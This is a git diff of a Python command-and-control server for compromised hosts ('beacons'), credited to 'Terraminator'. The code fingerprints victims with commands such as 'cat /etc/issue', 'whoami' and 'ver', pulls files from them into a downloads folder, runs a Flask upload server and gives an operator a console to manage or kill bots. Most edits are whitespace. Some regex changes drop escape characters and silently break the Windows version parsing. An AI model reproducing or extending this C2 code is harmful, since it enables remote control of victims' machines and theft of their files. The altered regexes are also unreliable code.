@@ -39,7 +39,7 @@ banner="""
 ██║░░██╗██║░░░░░██║░░██║██║░░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██║██╔═██╗░██╔══╝░░
 ╚█████╔╝███████╗╚█████╔╝╚██████╔╝██████╔╝██████╔╝░░░██║░░░██║░░██║██║██║░╚██╗███████╗
 ░╚════╝░╚══════╝░╚════╝░░╚═════╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚══════╝
-Made by Terraminator                                                                                          
+Made by Terraminator
 """
 
 class bcolors:
@@ -64,7 +64,7 @@ routes=[]
 threads=[]
 socks=[]
 
-logger = logging.getLogger() 
+logger = logging.getLogger()
 logger.disabled = True
 
 
@@ -101,7 +101,7 @@ def dec(data):
 def _send(conn, data, e=True):
     sleep(0.01)
     if e:
-        if type(data)==bytes: 
+        if type(data)==bytes:
             data+=b"EOF"
         else:
             data+="EOF"
@@ -185,7 +185,7 @@ def web_srv(q):
 
         app = Flask(__name__)
         UPLOAD_FOLDER = HOME+"downloads/"
-        app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER 
+        app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
         app.logger.removeHandler(default_handler)
         log = logging.getLogger('werkzeug')
         log.disabled = True
@@ -279,6 +279,7 @@ def handle_clients(conn, addr):
     conn.settimeout(None)
     a=arch.replace("\nEOF", "")
     if a=="linux":
+        print(f"{bcolors.OKGREEN}\033[Fplatform identified as linux!")
         _send(conn, MAGIC + "\n")
         _send(conn, "cat /etc/issue\n")
         issue=_recv(conn).rstrip("\n")
@@ -286,18 +287,19 @@ def handle_clients(conn, addr):
         usr=_recv(conn).rstrip("\n")
         arch=a
     elif a=="windows":
+        print(f"{bcolors.OKGREEN}\033[Fplatform identified as windows!")
         _send(conn, MAGIC + "\n")
         _send(conn, "ver\n")
         issue=_recv(conn).rstrip("\n")
         _send(conn, "whoami\n")
         usr=_recv(conn).rstrip("\n").lstrip("\n")
         try:
-            issue=re.findall('Microsoft Windows \[Version.*\]', issue, re.M)[0].replace("\n", "")
+            issue=re.findall('Microsoft Windows [Version.*]', issue, re.M)[0].replace("\n", "")
         except:
             print("failed to identify issue", issue)
             issue="Microsoft Windows"
         try:
-            usr=re.findall('\\.*\>.*\n.*', usr, re.M)[0].lstrip(">\n").rstrip("\n").split("\n")[1]
+            usr=re.findall('\\.*>.*\n.*', usr, re.M)[0].lstrip(">\n").rstrip("\n").split("\n")[1]
         except:
             if len(usr.strip())<1:
                 print("failed to identify usr", usr)
@@ -321,12 +323,12 @@ def handle_clients(conn, addr):
             _send(conn, "whoami\n", False)
             usr=_recv(conn, False).rstrip("\n").lstrip("\n")
             try:
-                issue=re.findall('Microsoft Windows \[Version.*\]', issue, re.M)[0].replace("\n", "")
+                issue=re.findall('Microsoft Windows [Version.*]', issue, re.M)[0].replace("\n", "")
             except:
                 print("failed to identify issue", issue)
                 issue="Microsoft Windows"
             try:
-                usr=re.findall('\\.*\>.*\n.*', usr, re.M)[0].lstrip(">\n").rstrip("\n").split("\n")[1]
+                usr=re.findall('\\.*>.*\n.*', usr, re.M)[0].lstrip(">\n").rstrip("\n").split("\n")[1]
             except:
                 if len(usr.strip())<1:
                     print("failed to identify usr", usr)
@@ -334,15 +336,16 @@ def handle_clients(conn, addr):
                 else:
                     usr=usr.strip()
         else:
-            print(f"{bcolors.FAIL}unknown arch/not a beacon!")
+            print(f"{bcolors.FAIL}unknown platform/not a beacon!")
             arch="unknown"
             issue="unknown"
             _send(conn, "whoami\n", False)
-            
-            usr=_recv(conn, False).rstrip("\n")
-            if len(usr.rstrip("\n"))>1:
-                if len(usr.rstrip("\n"))>20:
-                    usr="unknown"
+            lol=_recv(conn, False).rstrip("\n")
+            if lol != "whoami":
+                usr=lol
+            else:
+                usr=_recv(conn, False).rstrip("\n")
+            if len(usr)>1:
                 print("connection to unknown system established in plain mode!\n")
             else:
                 print("connection could not be established!")
@@ -508,7 +511,7 @@ def console(id):
                                 with open(os.getcwd() + "/../downloads/" + path + str(src.replace("\n", "")), "wb") as f:
                                     f.write(data)
                                 print("downloaded {} to {}".format(src, os.getcwd().replace("/static/", "") + "/downloads/" + src.replace("\n", "")))
-                    
+
                 elif line.rstrip("\n")=="exit":
                     try:
                         bots.remove((c, addr, issue, usr, e))
@@ -609,7 +612,7 @@ def main():
         elif cmd == "restart web":
             print("restarting web server...")
             web_r.put("restart")
-        
+
         elif "delete" in cmd or "kill" in cmd:
             if len(cmd.split())<2:
                 if "delete" in cmd:
@@ -649,7 +652,7 @@ def main():
         elif cmd=="routes":
             for r in routes:
                 print(r)
-                
+
         elif cmd=="read_weblog":
             if not os.path.exists(f"{HOME}static/web_log.txt"):
                 print("no log there yet!")
@@ -674,12 +677,17 @@ def main():
                 pass
             for so in socks:
                 so.close()
-            
+
             sys.exit(0)
         elif cmd != "":
             print(f"{bcolors.WARNING}unknown command")
 
 
 if __name__=='__main__':
-    os.chdir(HOME)
+    try:
+        os.chdir(HOME)
+    except:
+        HOME=os.getcwd()+"/"
+        print(f"using {HOME} as HOME dir because specified path doesn't exist!")
+        os.chdir(HOME)
     main()
